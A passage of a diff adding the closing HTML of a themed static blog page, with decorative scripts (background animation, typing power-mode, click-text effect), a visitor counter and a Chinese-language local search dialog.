+}</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="true" data-text="I,LOVE,YOU" data-fontsize="15px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
